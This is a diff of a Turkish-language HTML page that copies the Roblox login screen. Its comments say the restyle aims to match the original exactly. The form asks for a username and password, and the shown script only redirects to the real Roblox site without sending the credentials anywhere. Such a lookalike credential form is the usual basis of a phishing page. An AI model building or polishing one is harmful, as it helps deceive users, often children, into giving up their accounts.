@@ -3,16 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Giriş</title>
+    <title>Giriş - Roblox</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: "HMD", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
+            /* İstediğin Arka Plan Resmi */
             background-image: url('https://assets.turbologo.com/blog/tr/2021/11/18072335/roblox-brand-958x575.png');
             background-size: cover;
             background-position: center;
@@ -24,7 +25,7 @@
             overflow: hidden;
         }
 
-        /* Arka plan karartma katmanı */
+        /* Karartma Katmanı */
         body::before {
             content: "";
             position: absolute;
@@ -33,7 +34,7 @@
             z-index: 0;
         }
 
-        /* Sağ Üst Navbar */
+        /* SAĞ ÜST BUTONLAR (Eski özellikler duruyor) */
         .navbar {
             position: absolute;
             top: 20px;
@@ -56,73 +57,86 @@
         .btn-outline { background: transparent; color: white; border: 1px solid white; }
         .nav-link:hover { opacity: 0.8; }
 
-        /* Giriş Paneli */
-        .login-box {
+        /* ORTA PANEL - BİRE BİR ORİJİNAL */
+        .login-container {
             position: relative;
             z-index: 5;
-            background-color: #2B2D2F;
-            padding: 40px;
-            border-radius: 8px;
-            width: 380px;
+            background-color: #393b3d; 
+            width: 400px;
+            padding: 30px 40px 40px 40px;
+            border-radius: 4px;
             text-align: center;
-            box-shadow: 0px 8px 24px rgba(0,0,0,0.6);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
 
-        .logo img {
-            width: 50px;
+        .logo-area { margin-bottom: 25px; }
+        .logo-area img {
+            width: 55px;
             filter: brightness(0) invert(1);
-            margin-bottom: 20px;
         }
 
-        h2 { color: white; margin-bottom: 25px; font-weight: 600; font-size: 20px; }
+        h2 {
+            color: #fff;
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 25px;
+        }
 
         input {
             width: 100%;
-            padding: 12px;
-            margin-bottom: 12px;
+            height: 42px;
+            padding: 0 12px;
+            background-color: #232527;
+            border: 1px solid #111;
             border-radius: 4px;
-            border: 1px solid #393B3D;
-            background-color: #393B3D;
-            color: white;
+            color: #fff;
+            font-size: 16px;
+            margin-bottom: 12px;
             outline: none;
         }
 
-        input:focus { border-color: #00A2FF; }
+        input:focus { border-color: #fff; }
 
-        /* MAVİ GİRİŞ BUTONU */
-        .main-login-btn {
+        /* GİRİŞ YAP BUTONU - GERÇEK MAVİ */
+        .login-btn {
             width: 100%;
-            padding: 12px;
-            background-color: #00A2FF;
-            color: white;
+            height: 40px;
+            background-color: #0084dd;
+            color: #fff;
             border: none;
             border-radius: 4px;
-            font-weight: bold;
             font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            margin-top: 10px;
+            margin-top: 5px;
             transition: 0.2s;
         }
 
-        .main-login-btn:hover { background-color: #0084D1; }
+        .login-btn:hover { background-color: #00a2ff; }
 
-        /* MAVİ LİNK */
+        /* MAVİ LİNKLER */
         .forgot-link {
-            display: inline-block;
-            margin-top: 20px;
-            color: #00A2FF;
+            display: block;
+            margin-top: 25px;
+            color: #00a2ff;
             text-decoration: none;
             font-size: 13px;
         }
 
         .forgot-link:hover { text-decoration: underline; }
 
-        /* Hata Mesajı Stili */
-        #error-msg {
-            color: #ff4d4d;
-            font-size: 12px;
-            margin-bottom: 10px;
-            display: none;
+        .signup-footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #555;
+            color: #fff;
+            font-size: 14px;
+        }
+
+        .signup-link {
+            color: #00a2ff;
+            text-decoration: none;
+            font-weight: 600;
         }
     </style>
 </head>
@@ -133,39 +147,35 @@
         <a href="https://www.roblox.com/login" class="nav-link btn-outline">Giriş Yap</a>
     </div>
 
-    <div class="login-box">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
+    <div class="login-container">
+        <div class="logo-area">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Logo">
         </div>
 
-        <h2>Roblox'a Giriş Yap</h2>
-        
-        <div id="error-msg">Lütfen kullanıcı adı ve şifrenizi girin.</div>
+        <h2>Roblox Hesabına Giriş Yap</h2>
 
-        <form id="robloxForm">
-            <input type="text" id="userInput" placeholder="Kullanıcı Adı / E-posta" required>
-            <input type="password" id="passInput" placeholder="Şifre" required>
-            
-            <button type="button" class="main-login-btn" onclick="validateAndLogin()">Giriş Yap</button>
+        <form>
+            <input type="text" id="u" placeholder="Kullanıcı Adı/E-posta/Telefon" required>
+            <input type="password" id="p" placeholder="Şifre" required>
+            <button type="button" class="login-btn" onclick="checkLogin()">Giriş Yap</button>
         </form>
-        
+
         <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-link">Şifremi veya Kullanıcı Adımı Unuttum</a>
+
+        <div class="signup-footer">
+            Hesabın yok mu? <a href="https://www.roblox.com/" class="signup-link">Kaydol</a>
+        </div>
     </div>
 
     <script>
-        function validateAndLogin() {
-            const user = document.getElementById('userInput').value;
-            const pass = document.getElementById('passInput').value;
-            const error = document.getElementById('error-msg');
-
-            if (user === "" || pass === "") {
-                // Eğer kutular boşsa hata mesajını göster
-                error.style.display = "block";
-                error.innerText = "Kullanıcı adı veya şifre boş bırakılamaz!";
-            } else {
-                // Kutular doluysa gerçek Roblox giriş sayfasına yönlendir
-                error.style.display = "none";
+        function checkLogin() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            if(user && pass) {
+                // Bilgi girildiyse gerçek siteye gider
                 window.location.href = "https://www.roblox.com/login";
+            } else {
+                alert("Lütfen tüm alanları doldur!");
             }
         }
     </script>
